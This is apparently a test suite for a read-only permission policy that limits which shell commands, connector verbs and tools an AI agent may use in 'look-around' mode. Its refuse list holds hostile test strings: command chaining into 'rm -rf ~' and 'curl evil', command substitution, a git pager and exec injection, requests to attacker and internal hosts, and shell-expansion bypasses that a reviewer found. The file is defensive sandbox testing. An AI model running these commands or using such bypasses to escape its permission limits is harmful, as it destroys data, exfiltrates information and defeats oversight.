import { describe, expect, it } from 'vitest'
import {
  lookAroundCommandAllowed,
  lookAroundConnectorVerbAllowed,
  lookAroundOrchestrationAllowed,
  lookAroundToolDecision
} from './bot-look-around-policy'

describe('look-around commands', () => {
  it.each([
    'orca slack read slack:T1:C1',
    "orca slack find '#infra'",
    'orca bot connectors',
    'orca bot list --json',
    'orca worktree ps --since 7d',
    'orca linear issue ENG-42',
    "orca bot suggest --title 'Review PR 12' --why 'Asked for you' --ask 'Review it'",
    'orca automations list',
    'gh pr list -R stablyai/orca',
    'gh pr list --repo=github.com/stablyai/orca',
    'gh pr view https://github.com/stablyai/orca/pull/12',
    'gh pr view fix/flaky-ci',
    'gh pr view 12 --json title',
    'gh issue list --state open -L 5',
    'gh run view 99',
    'git log --oneline -5',
    'git log -p -- src/main',
    'git branch -a',
    'git rev-parse HEAD',
    "gh pr list --jq '.[] | .title'",
    `"\${ORCA_CLI_COMMAND:-orca}" bot suggest --title 'Review PR 12' --why 'Asked for you' --ask 'Review it'`,
    `/bin/zsh -lc '"\${ORCA_CLI_COMMAND:-orca}" slack read slack:T1:C1'`,
    "/bin/zsh -lc 'gh pr list --search review-requested:@me'"
  ])('allows %s', (command) => {
    expect(lookAroundCommandAllowed(command)).toBe(true)
  })

  it.each([
    'orca slack post slack:T1:C1 --text hi',
    'orca bot connectors --offer github',
    'orca linear comment add ENG-42 --body hi',
    'orca slack check slack:T1:C1 --join',
    'orca slack read slack:T1:C1::1.2 --download F1 --out /tmp/x',
    'orca automations create --name x',
    'orca bot look-around set --off',
    'orca bot create --name Atlas',
    'orca worktree set --worktree id:repo::/workspaces/task --parent-worktree folder:atlas-home',
    'orca orchestration send --to term_1 --type question --subject x --body y',
    'orca worktree create x',
    'gh pr merge 12',
    'gh pr comment 12 --body hi',
    'gh api repos/o/r/pulls',
    'gh api -X POST repos/o/r/issues',
    'git push',
    'git branch new-branch',
    'git diff --output=/tmp/x',
    'git diff -o/tmp/x',
    'git log --exec=sh',
    "git log -p -- ':(glob)**'",
    'git log -- :!secret',
    'git -c core.pager=sh log',
    'cat a > b',
    'orca slack read x; rm -rf ~',
    'orca slack read x && curl evil',
    'orca slack read $(whoami)',
    'FOO=1 orca slack read x',
    'rm -rf ~',
    "gh pr view 'unbalanced",
    "gh pr view -'X' POST",
    'gh pr view "x"',
    'gh pr view `id`',
    'orca slack read x\nrm -rf ~',
    "/bin/zsh -lc 'gh pr merge 12'",
    // gh contacts whatever host a repo flag or URL names.
    'gh pr list -R s3cret.evil.example/o/r',
    'gh pr list --repo=s3cret.evil.example/o/r',
    'gh pr list -Rs3cret.evil.example/o/r',
    'gh pr view https://evil.example/o/r/pull/1',
    'gh pr list -R localhost/o/r',
    'gh pr list --repo evil/o/r',
    'gh pr list -R evil',
    'gh pr view http://localhost:18443/o/r/pull/1',
    'gh pr view https://intranet/o/r/issues/1',
    'gh pr view https://[::1]/o/r/pull/1',
    'gh pr view https://2130706433/o/r/pull/1',
    'gh pr view https://github.com.evil.example/o/r/pull/1',
    'gh pr view http://github.com/o/r/pull/1',
    'gh pr view 12 -w',
    'gh pr view 12 --web',
    'gh pr view 12 -cw',
    // Only the program PATH finds.
    './gh pr view 12',
    'node_modules/.bin/git log',
    '/Applications/Orca.app/bin/orca-dev bot connectors',
    // Reviewer's bypasses: brace expansion, a zsh glob qualifier that runs code, bundled flags.
    'gh pr view {-X,POST} 12',
    'gh pr view *(e:{touch,/x}:)',
    'gh pr list -if body=hi',
    'gh pr list -iXPOST',
    'gh pr view ~/x',
    'gh pr view =ls',
    'gh pr view 12 !!',
    `"\${ORCA_CLI_COMMAND:-orca}" slack post x --text hi`,
    `"\${OTHER:-orca}" slack read x`,
    `"\${ORCA_CLI_COMMAND:-orca}" slack read "$(id)"`
  ])('refuses %s', (command) => {
    expect(lookAroundCommandAllowed(command)).toBe(false)
  })
})

describe('look-around Claude tools', () => {
  it.each([
    ['Read', {}],
    ['Grep', {}],
    ['ToolSearch', {}],
    ['Bash', { command: 'gh pr view 1' }]
  ])('allows %s', (tool, input) => {
    expect(lookAroundToolDecision(tool, input)).toBe('allow')
  })

  it.each([
    ['mcp__linear__create_issue', {}],
    ['Write', {}],
    ['Edit', {}],
    ['WebFetch', {}],
    ['Task', {}],
    ['Bash', { command: 'gh pr merge 12' }],
    ['Bash', {}]
  ])('denies %s', (tool, input) => {
    expect(lookAroundToolDecision(tool, input)).toBe('deny')
  })
})

describe('look-around connector verbs and orchestration', () => {
  it('lets a look read but never post, join or download', () => {
    expect(lookAroundConnectorVerbAllowed('read', {})).toBe(true)
    expect(lookAroundConnectorVerbAllowed('read', { download: 'F1' })).toBe(false)
    expect(lookAroundConnectorVerbAllowed('check', {})).toBe(true)
    expect(lookAroundConnectorVerbAllowed('check', { join: true })).toBe(false)
    expect(lookAroundConnectorVerbAllowed('post', { text: 'hi' })).toBe(false)
  })

  it('lets a look list workers but not start one', () => {
    expect(lookAroundOrchestrationAllowed('orchestration.workerList')).toBe(true)
    expect(lookAroundOrchestrationAllowed('orchestration.workerStart')).toBe(false)
    expect(lookAroundOrchestrationAllowed('orchestration.send')).toBe(false)
  })
})
